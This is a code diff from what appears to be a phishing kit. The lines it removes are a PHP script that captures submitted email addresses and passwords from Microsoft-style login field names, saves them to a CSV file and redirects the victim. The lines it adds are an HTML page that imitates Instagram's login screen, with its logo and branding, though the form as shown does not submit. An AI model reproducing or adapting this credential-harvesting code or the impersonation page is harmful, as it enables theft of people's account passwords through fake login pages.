@@ -1,47 +1,39 @@
-<?php 
-
-error_reporting(E_ALL);
-ini_set('display_errors', '1');
-
-$datos_usuario = $_POST; //guardamos los datos del usuario en una variable
-$correo_usuario = $datos_usuario['loginfmt']; //guardamos el correo del usuario
-$contrasena_usuario = $datos_usuario['passwd']; //guardamos la contraseña del usuario
-
-
-// Nombre de archivo
-$a = 'programa_interprete/datos_usuarios.csv';
-
-if (file_exists($a)) {
-
-    // Lee todo el archivo y lo carga a un vector
-    $data = file($a);
-    // Agrega el dato al vector
-    array_unshift($data, "$correo_usuario,$contrasena_usuario");
-    // Abre el archivo para escritura, truncando el contenido
-    $file = fopen($a, 'w');
-    // recorre el vector y reescribe todo el archivo
-    foreach($data as $l){
-    fwrite($file, "$l\n");
-    }
-    fclose($file);
-
-} else {
-    fopen("programa_interprete/datos_usuarios.csv", "w");
-    
-    // Lee todo el archivo y lo carga a un vector
-    $data = file($a);
-    // Agrega el dato al vector
-    array_unshift($data, "$correo_usuario,$contrasena_usuario");
-    // Abre el archivo para escritura, truncando el contenido
-    $file = fopen($a, 'w');
-    // recorre el vector y reescribe todo el archivo
-    foreach($data as $l){
-    fwrite($file, "$l\n");
-    }
-    fclose($file);
-}
-
-header('Location: redirect/index.html');
-
-?>
-
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/main.css">
+  <title>Instagram</title>
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <div class="c-panel__form">
+            <input type="text" class="c-panel__input" placeholder="Phone number, username, or email">
+            <input type="text" class="c-panel__input" placeholder="Password">
+            <a href="#" class="c-btn">Log In</a>
+            <span class="c-panel__span">OR</span>
+          </div>
+          <a href="#" class="c-panel__facebook">Login with Facebook</a>
+          <a href="#" class="c-panel__forgot">Forgot password?</a>
+        </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <span>Sign up</span></p>
+        </div>
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+</body>
+</html>
